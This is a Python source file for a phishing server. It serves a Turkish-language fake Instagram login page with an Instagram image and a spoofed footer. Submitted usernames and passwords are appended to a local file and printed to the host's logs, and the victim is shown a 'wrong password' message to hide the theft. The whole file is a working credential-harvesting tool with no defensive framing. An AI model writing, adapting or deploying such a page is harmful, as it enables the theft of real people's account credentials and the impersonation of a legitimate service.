from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from pathlib import Path
from datetime import datetime
import os

DOSYA = Path(__file__).with_name("notlar.txt")

HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Giriş Yap</title>
<style>
body {
  margin: 0;
  min-height: 100vh;
  display: grid;
  place-items: center;
  background: #222629; /* Antrasit Arka Plan */
  font-family: Arial, sans-serif;
}
.panel {
  width: min(320px, 85vw);
  padding: 30px;
  background: white;
  border: 1px solid #ddd;
  border-radius: 10px;
  text-align: center;
}
/* Resim Stili */
.panel img {
  width: 90px;
  height: 90px;
  object-fit: cover;
  border-radius: 50%;
  margin-bottom: 10px;
  border: 2px solid #ddd;
}
input, button {
  box-sizing: border-box;
  width: 100%;
  padding: 12px;
  margin-top: 12px;
  border-radius: 5px;
}
input { border: 1px solid #ccc; }
button {
  background: #356fe0;
  color: white;
  border: 0;
  cursor: pointer;
}
small { color: #666; }
</style>
</head>
<body>
<main class="panel">
  <!-- Eklediğin görsel doğrudan burada gösteriliyor -->
  <img src="images.jpg" alt="Instagram">
  
  <h2>Hesap Paneli</h2>
  <p>instagram hesabına giriş</p>
  <form method="POST">
    <input name="kullanici" placeholder="Kullanıcı adı" maxlength="50" required>
    <input name="ornek" type="password" placeholder="Parola" maxlength="50" required>
    <small>İnstagram @ 2026</small>
    <button type="submit">Giriş Yap</button>
  </form>
</main>
</body>
</html>
"""

SONUC = """
<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Tamamlandı</title></head>
<body style="font-family:Arial;text-align:center;padding:50px 12px">
<h2>İşlem tamamlandı</h2>
<p>şifre hatalı</p>
<a href="/">Geri dön</a>
</body>
</html>
"""

class Handler(BaseHTTPRequestHandler):
    def cevap(self, metin, durum=200):
        self.send_response(durum)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(metin.encode("utf-8"))

    def do_GET(self):
        # Eğer tarayıcı resim dosyasını isterse doğrudan sun
        if self.path == "/images.jpg":
            try:
                with open("images.jpg", "rb") as img_file:
                    self.send_response(200)
                    self.send_header("Content-Type", "image/jpeg")
                    self.end_headers()
                    self.wfile.write(img_file.read())
                return
            except Exception:
                self.send_error(404)
                return
        
        self.cevap(HTML)

    def do_POST(self):
        uzunluk = int(self.headers.get("Content-Length", 0))
        if uzunluk > 4096:
            self.send_error(413)
            return

        veri = parse_qs(self.rfile.read(uzunluk).decode("utf-8"))
        kullanici = veri.get("kullanici", [""])[0].strip()[:50]
        ornek = veri.get("ornek", [""])[0].strip()[:50]

        if not kullanici or not ornek:
            self.send_error(400)
            return

        # Dosyaya kaydetme
        try:
            with DOSYA.open("a", encoding="utf-8") as f:
                f.write(
                    f"Tarih: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
                    f"Kullanıcı: {kullanici}\n"
                    f"Parola: {ornek}\n"
                    f"---\n"
                )
        except Exception:
            pass

        # Render loglarına anlık yazdırma
        print(f"=== YENİ GİRİŞ ===", flush=True)
        print(f"Kullanıcı: {kullanici} | Parola: {ornek}", flush=True)
        print("=" * 30, flush=True)

        self.cevap(SONUC)

    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
